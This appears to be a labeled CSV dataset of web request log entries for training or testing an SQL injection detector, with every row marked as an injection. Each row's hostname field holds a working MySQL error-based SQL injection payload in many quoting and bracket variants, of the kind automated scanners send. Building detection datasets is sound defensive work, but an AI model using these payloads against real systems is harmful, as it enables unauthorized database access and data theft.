full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') AS mSgx WHERE 9736=9736 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(8130=8130,1))),0x717a626271)) USING utf8)))-- Zrqy",1681395267.239237,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") AS ZrJe WHERE 8957=8957 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(8130=8130,1))),0x717a626271)) USING utf8)))-- zGDG",1681395267.243821,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) AS Xiag WHERE 5523=5523 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(8130=8130,1))),0x717a626271)) USING utf8)))-- Gmqv",1681395267.248773,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6` WHERE 3212=3212 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(8130=8130,1))),0x717a626271)) USING utf8)))-- RFbv",1681395267.312276,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6`) WHERE 1578=1578 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(8130=8130,1))),0x717a626271)) USING utf8)))-- YwNn",1681395267.31709,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6`=`192.168.43.6` AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(8130=8130,1))),0x717a626271)) USING utf8))) AND `192.168.43.6`=`192.168.43.6",1681395267.321996,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6""=""192.168.43.6"" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(8130=8130,1))),0x717a626271)) USING utf8))) AND ""192.168.43.6""=""192.168.43.6",1681395267.326934,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6]-(SELECT 0 WHERE 4980=4980 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(8130=8130,1))),0x717a626271)) USING utf8))))|[192.168.43.6",1681395267.332235,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' IN BOOLEAN MODE) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(8130=8130,1))),0x717a626271)) USING utf8)))#",1681395267.337665,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- ghCR",1681395267.344615,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- ltgr",1681395267.349213,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- tMMZ",1681395267.35405,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- erPA",1681395267.358958,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND (4713=4713",1681395267.374285,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6)) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ((4106=4106",1681395267.378642,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND (((6792=6792",1681395267.384984,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))",1681395267.459096,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ('vSiI'='vSiI",1681395267.464576,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND (('iFAC'='iFAC",1681395267.470272,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ((('lmtd'='lmtd",1681395267.476794,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND 'Pdns'='Pdns",1681395267.534375,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ('QMah' LIKE 'QMah",1681395267.539584,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND (('rKsH' LIKE 'rKsH",1681395267.545087,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ((('bphb' LIKE 'bphb",1681395267.5509,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6%' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND 'fqWi%'='fqWi",1681395267.556538,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND 'ruKQ' LIKE 'ruKQ",1681395267.562379,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND (""nZln""=""nZln",1681395267.567414,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"")) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ((""aXRr""=""aXRr",1681395267.571743,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6""))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND (((""eHnl""=""eHnl",1681395267.576625,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ""ZlRa""=""ZlRa",1681395267.581577,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND (""isYT"" LIKE ""isYT",1681395267.586053,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"")) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ((""lXtV"" LIKE ""lXtV",1681395267.59102,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6""))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND (((""VncT"" LIKE ""VncT",1681395267.595681,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ""uZNL"" LIKE ""uZNL",1681395267.600848,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- dlrX",1681395267.607289,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))# RxWg",1681395267.612432,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) OR 'PYlp'='UkdD",1681395267.617098,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') WHERE 4999=4999 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- Fgop",1681395267.621704,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") WHERE 8732=8732 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- puWG",1681395267.627231,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) WHERE 6458=6458 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- dIWH",1681395267.631495,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' WHERE 6721=6721 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- MKmJ",1681395267.636357,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" WHERE 4608=4608 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- KBzE",1681395267.642944,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 WHERE 9773=9773 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- lkAZ",1681395267.64726,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'||(SELECT 0x6c6b4c70 WHERE 6778=6778 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))))||'",1681395267.652179,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'||(SELECT 0x6b797673 FROM DUAL WHERE 1658=1658 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))))||'",1681395267.656901,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'+(SELECT 0x487a7a61 WHERE 6673=6673 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))))+'",1681395267.66189,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6||(SELECT 0x67665478 FROM DUAL WHERE 1719=1719 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))))||",1681395267.666867,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6||(SELECT 0x68646266 WHERE 6995=6995 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))))||",1681395267.671199,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6+(SELECT JZaq WHERE 5643=5643 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))))+",1681395267.676023,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6+(SELECT 0x6c595a4c WHERE 4994=4994 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))))+",1681395267.680223,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6')) AS iLHx WHERE 2301=2301 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- kLZy",1681395267.684758,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"")) AS CUda WHERE 7173=7173 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- ipGh",1681395267.68945,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6)) AS Hmat WHERE 4752=4752 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- NWhp",1681395267.693419,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') AS KqIw WHERE 2222=2222 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- njgA",1681395267.697757,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") AS XEXj WHERE 6682=6682 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- RUVD",1681395267.702078,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) AS nugT WHERE 9201=9201 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- DHPr",1681395267.70612,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6` WHERE 2201=2201 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- KCvI",1681395267.710921,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6`) WHERE 7591=7591 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))-- dwTZ",1681395267.715427,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6`=`192.168.43.6` OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND `192.168.43.6`=`192.168.43.6",1681395267.719312,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6""=""192.168.43.6"" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))) AND ""192.168.43.6""=""192.168.43.6",1681395267.723679,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6]-(SELECT 0 WHERE 7838=7838 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8))))|[192.168.43.6",1681395267.728243,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' IN BOOLEAN MODE) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(3625=3625,1))),0x717a626271)) USING utf8)))#",1681395267.739964,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- txgZ",1681395267.744776,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SfQz",1681395267.749262,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IIdY",1681395267.756001,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- onxZ",1681395267.762902,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (6800=6800",1681395267.768051,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6)) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((5788=5788",1681395267.772083,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6))) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (((7449=7449",1681395267.776731,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",1681395267.780786,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('MzxT'='MzxT",1681395267.78551,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6')) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (('rXki'='rXki",1681395267.790937,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'))) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((('OQTw'='OQTw",1681395267.860998,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'KJhX'='KJhX",1681395267.871436,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('bFeR' LIKE 'bFeR",1681395267.877081,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6')) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (('MaCR' LIKE 'MaCR",1681395267.935399,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'))) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((('LUvA' LIKE 'LUvA",1681395268.025439,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6%' AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'vTlw%'='vTlw",1681395268.030227,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'TtBp' LIKE 'TtBp",1681395268.034765,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (""jQGw""=""jQGw",1681395268.039842,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"")) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((""BACz""=""BACz",1681395268.100888,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6""))) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (((""ZloT""=""ZloT",1681395268.104901,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ""MYMI""=""MYMI",1681395268.109988,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (""FOVx"" LIKE ""FOVx",1681395268.114617,0,2,0.1,0,0.0,1
